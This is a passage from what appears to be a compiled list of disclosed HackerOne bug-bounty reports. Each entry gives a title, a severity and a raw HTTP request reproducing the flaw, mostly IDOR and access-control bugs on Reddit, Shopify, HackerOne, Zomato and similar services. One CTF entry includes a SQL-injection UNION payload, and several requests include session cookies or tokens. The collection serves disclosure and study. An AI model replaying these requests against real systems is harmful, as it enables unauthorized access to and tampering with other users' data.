PUT /api/v1/note/b9db186a-c0af-462d-ad71-c30c2bfd7cf5 HTTP/1.1
Host: api.outpost.co
Content-Length: 102
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: https://app.outpost.co
Referer: https://app.outpost.co/
```

## 43. [#2487889](https://hackerone.com/reports/2487889)  -  Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint
*critical*

```http
POST /bugs.json HTTP/2
Host: hackerone.com
Cookie:  __Host-session=Your-Session-Here
X-Csrf-Token: Your-Csrf-Here
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 390

text_query=1&organization_id=58579&persist=true&sort_type=pg_search_rank&view=message&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&substates%5B%5D=spam&duplicates_must_have_no_ref=true
```

## 44. [#471265](https://hackerone.com/reports/471265)  -  unuse domain still in using at wechat by Starbucks East China
*critical*

```http
GET /v5/bind.html HTTP/1.1
Host: coupon.ec-starbucks.cn
Cookie: PHPSESSID=ip1f71qqak3kvakksu28bensjlapsh9a; Hm_lvt_b7c2e12efc764f8179148ddbece8211f=15454894…

'''
```

## 45. [#1489077](https://hackerone.com/reports/1489077)  -  Bypass of fix #1370749
*low, $900*

```http
POST /admin/online-store/themes?hmac=████&host=c2hha3RpLWphbjIwMjIubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-IN&session=███&shop=shakti-jan2022.myshopify.com&timestamp=1645562098&_signed_params=host%2Clocale%2Csession%2Cshop%2Ctimestamp HTTP/1.1
Host: shakti-jan2022.myshopify.com
Content-Length: 581
Origin: null
Content-Type: application/x-www-form-urlencoded
Cookie: ████

appShellSessionToken=███████&appShellAttempts=1&appShellReason=
```

## 46. [#1262434](https://hackerone.com/reports/1262434)  -  Theme editor `oseid` parameter is leaked to third-party services through the `Referer` header which leads to somekind of storefront password bypass.
*low, $500*

```http
GET /pin/create/button/?url=https://{shop}.myshopify.com/products/example-t-shirt&media=//cdn.shopify.com/s/files/1/0262/8304/9016/products/saltymermaid-avatar_f9d13a6b-bb24-4dd8-b611-70ad25dd2d24_1024x1024.png?v=1617650754&description=Example%20T-Shirt HTTP/1.1
	Host: pinterest.com
	Referer: https://{shop}.myshopify.com/products/example-t-shirt?oseid={oseid}
```

## 47. [#1084865](https://hackerone.com/reports/1084865)  -  [h1-2102] [Oberlo] Least privileged user can cancel account owner's subscription via POST on  /payments/subscribe
*low*

```http
POST /payments/subscribe HTTP/1.1
Host: app.oberlo.com
Content-Length: 19
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=UTF-8
Origin: https://app.oberlo.com
Referer: https://app.oberlo.com/settings/other
Cookie: <REDACTED>

{
"planId":10
}
```

## 48. [#3325582](https://hackerone.com/reports/3325582)  -  User Can Delete Other Users' Personal Access Tokens at /delete-token/{token_id}/ on Mozilla Pontoon
*low*

```http
POST /generate-token/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: {your cookies here}
Referer: https://mozilla-pontoon-staging.herokuapp.com/settings/
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: https://mozilla-pontoon-staging.herokuapp.com
X-Requested-With: XMLHttpRequest

csrfmiddlewaretoken={your csrf token here}&name=adil
```

## 49. [#3325582](https://hackerone.com/reports/3325582)  -  User Can Delete Other Users' Personal Access Tokens at /delete-token/{token_id}/ on Mozilla Pontoon
*low*

```http
POST /delete-token/{Victim Token Id Here}/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: {Attacker Cookies Here}
Referer: https://mozilla-pontoon-staging.herokuapp.com/settings/
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: https://mozilla-pontoon-staging.herokuapp.com
X-Requested-With: XMLHttpRequest

csrfmiddlewaretoken={Attacker CSRF Token Here}
```

## 50. [#1755555](https://hackerone.com/reports/1755555)  -  Possibility to delete files attached to deck cards of other users
*low*

```http
DELETE /apps/deck/cards/63/attachment/file:116 HTTP/2
Host: redacted
Cookie: oc_sessionPassphrase=1icX1AnixyJWysU9xZCwhaEr%2Bb8TM%2FNvgck%2F1nv216h1fLefCLcWN5Vt%2BgO3%2B…
Origin: redacted
```

## 51. [#2055081](https://hackerone.com/reports/2055081)  -  Google dork lead to unsubscribe anyone from all Banfield emails
*low*

```http
POST /Security/SendClientIdMail HTTP/2
Host: █████
Cookie: ████████
Referer: ████████-Type: application/x-www-form-urlencoded; charset█████████████████utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 159
Origin: ███████████
```

## 52. [#854290](https://hackerone.com/reports/854290)  -  IDOR on update user preferences
*critical*

```http
PUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0
Host: api.outpost.co
Content-Length: 434
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: https://app.outpost.co
Referer: https://app.outpost.co/
Cookie: auth={user2-cookie}

{
  "firstName": "user1-changed-by-user2",
  "lastName": "null",
  "email": "{attacker-email}",
  "role": "USER",
  "defaultMailboxUuid": "",
  "mailboxUuids": [
    "e4a63ae3-bb10-46f8-be28-a2660a2344ec"
  ],
  "signature": "{signature}",
  "timezone": "Europe/Moscow",
  "defaultSendAndResolve": false,
  "selectFirstConversation": true
}
```

## 53. [#544329](https://hackerone.com/reports/544329)  -  IDOR and statistics leakage in Orders
*medium, $289*

```http
POST /web-client/api/orders/stats/query HTTP/1.1
Host: app.mopub.com
Referer: https://app.mopub.com/orders
Content-Type: application/json
Content-Length: 98
Cookie: csrftoken={TOKEN}; sessionid={SID}; mp_mixpanel__c=1;

{"startTime":"2019-04-07","endTime":"2019-04-20","orderKeys":["43b29d60a9724fa9abbdc800044002d6"]}
```

## 54. [#544329](https://hackerone.com/reports/544329)  -  IDOR and statistics leakage in Orders
*medium, $289*

```http
POST /web-client/api/orders/stats/query HTTP/1.1
Host: app.mopub.com
Referer: https://app.mopub.com/orders
Content-Type: application/json
Content-Length: 98
Cookie: csrftoken={TOKEN}; sessionid={SID}; mp_mixpanel__c=1;
```

## 55. [#447494](https://hackerone.com/reports/447494)  -  Share recipient can modify a share's expiration date
*medium, $100*

```http
PUT /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/74 HTTP/1.1
Authorization: Basic anJlYWNoZXI6d0xzVU5vVnpDZDFsNGpkdmIxZnFtOWlGUHpWbDRmWkNHTDdTMUtxRml3R3M1ZlFhc1FVUXNOV2tvY3gwcUVmbllnNmdBMVJR
Host: 192.168.1.22
Cookie: nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc_sessionPassphrase=O5dbusaO3KwFs6…
Content-Length: 21
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

expireDate=2018-11-25
```

## 56. [#1330529](https://hackerone.com/reports/1330529)  -  Claiming the listing of a non-delivery restaurant through OTP manipulation
*critical, $3,250*

```http
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Content-Length: 58
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Referer: https://www.zomato.com/partner_with_us/ownership

{"number":"XXXXXXXXXX","isdCode":"+91","resId":"XXXXXXXXXX"}
```

## 57. [#1330529](https://hackerone.com/reports/1330529)  -  Claiming the listing of a non-delivery restaurant through OTP manipulation
*critical, $3,250*

```http
POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXX
Content-Length: 68
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
Referer: https://www.zomato.com/partner_with_us/ownership

{"verificationCode":XXX,"requestId":"XXXXXXXX","resId":"XXXXXXXXX"}
```

## 58. [#1330529](https://hackerone.com/reports/1330529)  -  Claiming the listing of a non-delivery restaurant through OTP manipulation
*critical, $3,250*

```http
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Content-Length: 58
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
```

## 59. [#1330529](https://hackerone.com/reports/1330529)  -  Claiming the listing of a non-delivery restaurant through OTP manipulation
*critical, $3,250*

```http
POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2
Host: www.zomato.com
Cookie: XXXXXXXXXXXXXXXX
Content-Length: 68
Content-Type: application/json;charset=UTF-8
Origin: https://www.zomato.com
```

## 60. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6MX0= HTTP/1.1
Host: hackyholidays.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://hackyholidays.h1ctf.com/people-rater
```

## 61. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```json
{F1139834}

+ Thus as per the response says, it was returned with 404. Finally, after guessing the api as api/user on the above SQL payload as:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user/\%22--%20-%22,NULL,%22aaa%27%22--%20-


**Response**

{F1139841}

`Invalid content type detected`

+ As api/user was valid, that means we've to find username and password out of this. In SQL database, when we try to find any character we use the % symbol in the back-end query.

`Select * from users
where username like 'a%' 
`

+ At this concept, I tried to find the username char by char on the above api/user . thus, our final exploit will be

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?username=a%\%22--%20-%22,NULL,%22aaa%27%22--%20-

+ If the char will be valid for api/user?username=a%, it'll return with "invalid content type" otherwise "Expected HTTP status 200, Received: 204".

+ So, after bruteforcing for about 20 mins char by char, got the first char as "g " on username, returned with "invalid content-type". 
For the second char, it'll be api/user?username=gr%. After final exploitation for char, got the username as grinchadmin.

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?username=grinchadmin%\%22--%20-%22,NULL,%22aaa%27%22--%20-

{F1139917}

`Invalid-content type`
# … truncated …
```

## 62. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
GET /people-rater/page/1 HTTP/1.1
Host: hackyholidays.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://hackyholidays.h1ctf.com/people-rater
```

## 63. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://hackyholidays.h1ctf.com/people-rater
```

## 64. [#1658418](https://hackerone.com/reports/1658418)  -  Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability
*high, $5,000*

```http
POST / HTTP/2
Host: gql.reddit.com
Content-Type: application/json
Content-Length: 62
Origin: https://www.reddit.com
Authorization: Bearer ourtoken
Referer: https://www.reddit.com/

{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit"}}
```

## 65. [#1658418](https://hackerone.com/reports/1658418)  -  Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability
*high, $5,000*

```http
POST / HTTP/2
Host: gql.reddit.com
Content-Type: application/json
Content-Length: 62
Origin: https://www.reddit.com
```

## 66. [#1969141](https://hackerone.com/reports/1969141)  -  Insecure Direct Object Reference (IDOR) - Delete Campaigns
*high*

```http
POST /graphql HTTP/2
Host: hackerone.com
Cookie: yourcookie
Referer: https://hackerone.com/organizations/opensea_demo/campaigns/242/edit
Content-Type: application/json
X-Csrf-Token: ███
Content-Length: 851
Origin: https://hackerone.com

{"operationName":"UpdateCampaign","variables":{"product_area":"campaigns","product_feature":"edit","input":{"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==","team_id":"Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU3MzI4","bounty_table_row_id":"Z2lkOi8vaGFja2Vyb25lL0JvdW50eVRhYmxlUm93LzEwODM2","start_date":"2023-05-05T09:00:00Z","end_date":"2023-05-08T05:00:00Z","critical":3,"high":2,"medium":1.5,"low":1.5,"structured_scope_ids":[],"researchers_information":"ccccccccccccccc"}},"query":"mutation UpdateCampaign($input: UpdateCampaignInput!) {\n  updateCampaign(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 67. [#1661113](https://hackerone.com/reports/1661113)  -  IDOR allows an attacker to modify the links of any user
*high*

```http
POST / HTTP/2
Host: gql.reddit.com
Content-Length: 62
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
Origin: https://www.reddit.com
Referer: https://www.reddit.com/

{"id":"11a239b07f86","variables":{"username":"*********"}}
```

## 68. [#1661113](https://hackerone.com/reports/1661113)  -  IDOR allows an attacker to modify the links of any user
*high*

```http
POST / HTTP/2
Host: gql.reddit.com
Content-Type: application/json
Content-Length: 173
Origin: https://www.reddit.com
Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Referer: https://www.reddit.com/

{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://www.hackerone.com","title":"hacker","type":"CUSTOM","id":"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *"}]}}}
```

## 69. [#1661113](https://hackerone.com/reports/1661113)  -  IDOR allows an attacker to modify the links of any user
*high*

```http
POST / HTTP/2
Host: gql.reddit.com
Content-Type: application/json
Content-Length: 173
Origin: https://www.reddit.com
```

## 70. [#1596663](https://hackerone.com/reports/1596663)  -  Admin can create a hidden admin account  which even the owner can not detect and remove and do administrative actions on the application.
*high*

```http
POST /api/v2.0/accounts/█████████/invitations HTTP/2
Host: ads-api.reddit.com
Content-Length: 87
Content-Type: application/json
Authorization: ██████
Origin: https://ads.reddit.com
Referer: https://ads.reddit.com/

{"data":{"recipient_email":"█████████","type":"ADMIN"}}
```

## 71. [#1596663](https://hackerone.com/reports/1596663)  -  Admin can create a hidden admin account  which even the owner can not detect and remove and do administrative actions on the application.
*high*

```http
POST /api/v2.0/accounts/█████████/invitations HTTP/2
Host: ads-api.reddit.com
Content-Length: 87
Content-Type: application/json
Authorization: ██████
Origin: https://ads.reddit.com
```

## 72. [#2207248](https://hackerone.com/reports/2207248)  -  IDOR on GraphQL queries BillingDocumentDownload and BillDetails
*medium, $5,000*

```http
POST /api/shopify/██████?operation=BillingDocumentDownload&type=mutation HTTP/2
Host: admin.shopify.com
Cookie: ██████
Content-Type: application/json
X-Csrf-Token: ████
Content-Length: 433
Origin: https://admin.shopify.com

{"operationName":"BillingDocumentDownload","variables":{"id":"████","documentType":"CREDIT_NOTE"},"query":"mutation BillingDocumentDownload($id: ID!, $documentType: BillingDocumentType) {\n  billingDocumentDownload(id: $id, documentType: $documentType) {\n    job {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 73. [#2040756](https://hackerone.com/reports/2040756)  -  An attacker can submit a Pentest Opportunity and change the status of the opportunity from submitted to in_review or reviewed
*medium*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Cookie: <COOKIES>
Referer: https://hackerone.com/opportunities/all
Content-Type: application/json
X-Csrf-Token: <CSRF-TOKEN>
Content-Type: application/json
Content-Length: 305
Origin: https://hackerone.com

{"query": "mutation {\r\n  reviewPentestOpportunity(\r\n    input: {\r\n       pentest_opportunity_id: \"<ID-FROM-STEP-3>\"  }) {\r\n    clientMutationId\r\n    errors {\r\n      total_count\r\n      edges{node{message}}\r\n    }\r\n    was_successful\r\n  }\r\n}\r\n"}
```

## 74. [#3114554](https://hackerone.com/reports/3114554)  -  Privilege Persistence via Cloned Agent
*medium*

```http
PATCH /api/w/BSsJ1zPUYE/assistant/agent_configurations/{agent-id} HTTP/2
Host: eu.dust.tt
Cookie: ..
Content-Length: 459
Content-Type: application/json
Origin: https://eu.dust.tt
Referer: https://eu.dust.tt/w/BSsJ1zPUYE/builder/assistants/JpY5xizXRo?flow=workspace_assistants

{"assistant":{"name":"gemini-pro-clone","pictureUrl":"https://dust.tt/static/emojis/bg-blue-300/brain/1f9e0","description":"An assistant designed to provide clear, concise, and factual responses efficiently.","instructions":"test-gemini-pro","status":"active","scope":"private","actions":[],"model":{"modelId":"claude-3-5-sonnet-20241022","providerId":"anthropic","temperature":0.7},"maxStepsPerRun":8,"visualizationEnabled":true,"templateId":null,"tags":[]}}
```

## 75. [#3114554](https://hackerone.com/reports/3114554)  -  Privilege Persistence via Cloned Agent
*medium*

```http
PATCH /api/w/BSsJ1zPUYE/assistant/agent_configurations/{agent-id} HTTP/2
Host: eu.dust.tt
Cookie: ..
Content-Length: 459
Content-Type: application/json
Origin: https://eu.dust.tt
```

## 76. [#1581528](https://hackerone.com/reports/1581528)  -  Can access the job name, creator name and can report any draft/under review/rejected job
*medium*

```http
POST /lite/flag-content?contentUrn=urn:li:jobPosting:3086455454&reason=OFFENSIVE&contentSource=JOBS_PREMIUM_OFFLINE&authorProfileId=0&trk=report-content HTTP/2
Host: www.linkedin.com
Cookie: XXX
Origin: https://www.linkedin.com
Referer: https://www.linkedin.com/jobs/view/3084381086/?refId=%EF%BF%BD%2F%EF%BF%BD%21d%EF%BF%BD%27%EF%BF%BDe%1A_s%EF%BF%BD%16%EF%BF%BD%EF%BF%BD&trk=d_flagship3_company
```

## 77. [#3112106](https://hackerone.com/reports/3112106)  -  BAC - Bypass chatbot restrictions via unauthorized mention injection
*medium*

```http
POST /api/w/BSsJ1zPUYE/assistant/conversations/PdBk9DSYXA/messages/UyXjPLmW5j/edit HTTP/2
Host: eu.dust.tt
Cookie: …
Content-Length: 124
Content-Type: application/json
Origin: [https://eu.dust.tt](https://eu.dust.tt/)
```

## 78. [#777942](https://hackerone.com/reports/777942)  -  Unrestricted access to any "connected pack" on docs
*medium*

```http
POST /internalAppApi/documents/F5Y1qJ3aw-/packs HTTP/1.1
Host: coda.io
Content-Length: 15
Origin: https://coda.io
X-Csrf-Token: InEwS0Z2U21xR09JUDI2Qkwi
Content-Type: application/json
Referer: https://coda.io/d/Untitled_dF5Y1qJ3aw-/asdf_suTAx
Cookie: /* Your Cookie */

{"packId":1063}
```

## 79. [#777942](https://hackerone.com/reports/777942)  -  Unrestricted access to any "connected pack" on docs
*medium*

```http
POST /internalAppApi/documents/F5Y1qJ3aw-/packs HTTP/1.1
Host: coda.io
Content-Length: 15
Origin: https://coda.io
X-Csrf-Token: InEwS0Z2U21xR09JUDI2Qkwi
Content-Type: application/json
Referer: https://coda.io/d/Untitled_dF5Y1qJ3aw-/asdf_suTAx
```

## 80. [#1129996](https://hackerone.com/reports/1129996)  -  Create alias does not validate account id
*medium*

```bash
curl 'http://localhost:50001/index.php/apps/mail/api/accounts/2000/aliases' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'requesttoken: 75bTbDfs3loR2Vr8pYPtefIjwiAQzQUtg2f9oeASmxI=:uv+XIBzaqg51imjI9/WcFZobsFpUiF1GsgiYio961Uc=' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Origin: http://localhost:50001' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: oc_sessionPassphrase=A%2BwmqbZZ4JJAydZ1Wg68GDAAhSdoipmHWCWTwfEJTIHmYyh6D59aMjilXtuhYbF8NMvfrUsvDuZ43d8nm91kpx0oe%2BnKm31YjI9%2FU0WsJK4Zqy5ygsi92Nhu4EPIn8%2Bg; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc5hwbau68t9=95154162557362dd231a75e7b065b1ea; nc_username=bob; nc_token=oe2FicKizx%2BUvvdToxpu%2Biob2h3vMJOD; nc_session_id=95154162557362dd231a75e7b065b1ea' \
  --data-raw '{"aliasName":"hello hello hello","alias":"hellohello@test.local"}' \
  --compressed
```

## 81. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## 82. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/secure-login
Host: hackyholidays.h1ctf.com

username=admin&password=admin
```

## 83. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/secure-login
Host: hackyholidays.h1ctf.com

username=access&password=admin
```

## 84. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/secure-login
Host: hackyholidays.h1ctf.com

username=access&password=computer
```

## 85. [#1692788](https://hackerone.com/reports/1692788)  -  Attacker is able to query Github repositories of arbitrary Shopify Hydrogen Users
*low, $900*

```http
POST /admin/internal/web/graphql/core?operation=GitHubRepositoriesQuery&type=query HTTP/2
Host: <ATTACKER_SHOPIFY_DOMAIN>
Cookie: <COOKIES_ATTACKER>
Content-Length: 778
X-Csrf-Token: <CSRF_TOKEN_ATTACKER>
Content-Type: application/json
```

## 86. [#1691195](https://hackerone.com/reports/1691195)  -  Missing rate limiting on password reset functionality allows to send lot of emails
*low, $100*

```http
POST /lostpassword/email HTTP/2
Host: ppp.woelkli.com
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; oc_sessionPassphrase=…
Content-Type: application/json;charset=utf-8
Content-Length: 30
Origin: https://ppp.woelkli.com
```

## 87. [#947728](https://hackerone.com/reports/947728)  -  staff can able to extend shopify trial period without admin permission
*low*

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Host: risinghunter.myshopify.com
Content-Length: 218
X-CSRF-Token: H9hN7Wt7-0Q1PwBhOsOIZMpEcCnp0WZQw8BM
content-type: application/json
Origin: https://risinghunter.myshopify.com
```

## 88. [#587687](https://hackerone.com/reports/587687)  -  IDOR to update folder name of other user
*low*

```http
POST / HTTP/1.1
Host: graphql2.trint.com
Referer: https://app.trint.com/trints
content-type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vaXNOZXdVc2VyIjp0cnVlLCJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWNlNTAyYTIxZTFjYWY3NTBkNmM3ZjU5IiwiaXNzIjoiaHR0cHM6Ly90cmludC5hdXRoMC5jb20vIiwic3ViIjoiZmFjZWJvb2t8NTM5NjM3MDE2NTY4MjUxIiwiYXVkIjoiaWNoNGh5VllQS0tnZUVvVGg2ZldQWGM2ZnJ2ZVRjVHEiLCJpYXQiOjE1NTg1MTIyOTYsImV4cCI6MTU2MDg3Mjg4MH0.umWI5RJnC3bO1NbP5TFI0A37H182U7J0WC3d_5W0xLc
Origin: https://app.trint.com
Content-Length: 490

{"operationName":"updateProject","variables":{"userId":"5ce502a21e1caf750d6c7f59","projectName":"abctesthorizontal","projectId":"i2lu5qZVTwWnQQhPp_g8Ig"},"query":"mutation updateProject($userId: String!, $projectName: String!, $projectId: String!) {\n  updateProject(userId: $userId, projectName: $projectName, projectId: $projectId) {\n    ...RenameProjectFragment\n    __typename\n  }\n}\n\nfragment RenameProjectFragment on Project {\n  _id\n  projectName\n  updated\n  __typename\n}\n"}
```

## 89. [#1213237](https://hackerone.com/reports/1213237)  -  Deleting all DMs on RedditGifts.com
*high, $5,000*

```http
DELETE /api/v1/messages/4423007/ HTTP/1.1
Host: www.redditgifts.com
Referer: https://www.redditgifts.com/api/
Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6…
```

## 90. [#853130](https://hackerone.com/reports/853130)  -  IDOR on stocky application-Low Stock-Varient-Settings-Columns
*medium, $750*

```http
POST /settings_for_low_stock_variants/111111 HTTP/1.1
Host: app.stockyhq.com
Referer: https://app.stockyhq.com/dashboard/low_stock
Content-Type: application/x-www-form-urlencoded
Content-Length: 968
Origin: https://app.stockyhq.com
Cookie:
```

## 91. [#308610](https://hackerone.com/reports/308610)  -  Read Access to all comments on unauthorized forums' discussions! IDOR!
*medium, $500*

```http
POST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1
Host: steamcommunity.com
X-Requested-With: XMLHttpRequest
Content-Length: 597
Cookie: ***********member-cookies****

gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true
```

## 92. [#1167453](https://hackerone.com/reports/1167453)  -  Add new development stores without permission
*medium*

```http
POST /services/signup/create HTTP/1.1
Host: app.shopify.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1224
Origin: https://app.shopify.com
Cookie: ...

_y=&ref=&ssid=&source=&source_url=&source_url_referer=&signup_code=&signup_source=development+shop&signup_source_details=test_app_or_theme&signup_page=&signup_page_referer=&signup_locale=&domain_to_connect=&signup%5Bshop_name%5D=newiez2&signup%5Bsubdomain%5D=&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bemail%5D=example%40gmail.com&signup%5Bpassword%5D=5syyyypT&signup%5Bconfirm_password%5D=5syyyypT&signup%5Baddress1%5D=Suite+10&signup%5Bcity%5D=London&signup%5Bprovince%5D=&signup%5Bzip%5D=Swe10928&signup%5Bcountry%5D=GB&signup%5Bphone%5D=&signup%5Bpos%5D=&signup%5Bextra%5D%5Baffiliate_shop%5D=eyJfcmFpbHMiOnsibWVzc2F&signup%5Bextra%5D%5Borganization_id%5D=1022333&signup%5Bextra%5D%5Bpartner_test_shop%5D=&signup%5Bsignup_types%5D%5B%5D=affiliate_shop&identity_account_experiment=
```

## 93. [#909863](https://hackerone.com/reports/909863)  -  Low privileged user can create high privileged user's KITCRM authorization token and can read and write message to KIT
*medium*

```http
POST /api/v1/arro_token?access_token=███████&myshopify_domain=alwayzhack.myshopify.com&id=42668326968 HTTP/1.1
Host: www.kitcrm.com
Content-Type: application/json
Cookie: 
Content-Length: 0
```

## 94. [#317332](https://hackerone.com/reports/317332)  -  Improper access control on adding a Register to an Outlet
*medium*

```http
POST /register/create/outlet_id/<outled id from B> HTTP/1.1
Host: <store B>.vendhq.com
Referer: https://<store B>.vendhq.com/register/<outled id from B>/new?confirmed=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 694
Cookie: <Cookie>

